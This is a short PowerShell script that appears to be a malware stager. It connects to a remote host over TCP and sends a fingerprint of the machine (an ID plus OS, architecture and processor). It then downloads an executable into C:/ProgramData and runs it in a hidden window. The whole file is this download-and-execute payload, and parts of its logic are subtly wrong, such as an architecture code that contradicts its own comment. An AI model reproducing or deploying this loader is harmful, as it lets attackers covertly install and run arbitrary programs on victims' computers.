$port=4153
$remoteHost = "127.0.0.1"

$padding = 0,0,0,0,0,0,0,39
$encoder = new-object System.Text.UTF8Encoding
$name = $encoder.Getbytes("39519bc2-9c07-4e76-8774-0554edcaf7c3") # Change to make dynamic!!!!!!!!!!!!!!!
# W = Windows ; 6 = x64 ; I = Intel
$os = $encoder.Getbytes("W")
if ((gwmi Win32_OperatingSystem).OSArchitecture -eq '64-bit') {
	$arch = $encoder.Getbytes("3")
} else {
	$arch = $encoder.Getbytes("6")
}
if ((Get-WmiObject Win32_processor).Name -contains "Intel") {
    $proc = $encoder.Getbytes("I")
} elseif ((Get-WmiObject Win32_processor).Name -contains "Arm"){
    $proc = $encoder.Getbytes("A")
}

$socket = new-object System.Net.Sockets.TcpClient($remoteHost, $port)

$data = $padding + $name + $os + $arch + $proc
$stream = $socket.GetStream()
$stream.Write($data, 0, $data.Length)

$buffer = new-object System.Byte[] 2048;
$file = 'c:/ProgramData/nice.exe'; # Change to make dynamic!!!!!!!!!!!!!!!
$fileStream = New-Object System.IO.FileStream($file, [System.IO.FileMode]'Create', [System.IO.FileAccess]'Write');

do
{
	$read = $null;
	while($stream.DataAvailable -or $read -eq $null) {
			$read = $stream.Read($buffer, 0, 2048);
			if ($read -gt 0) {
				$fileStream.Write($buffer, 0, $read);
			}
		}
} While ($read -gt 0);

$fileStream.Close();
Start-Process -FilePath "C:\ProgramData\nice.exe" -WindowStyle hidden # Change to make dynamic!!!!!!!!!!!!!!!
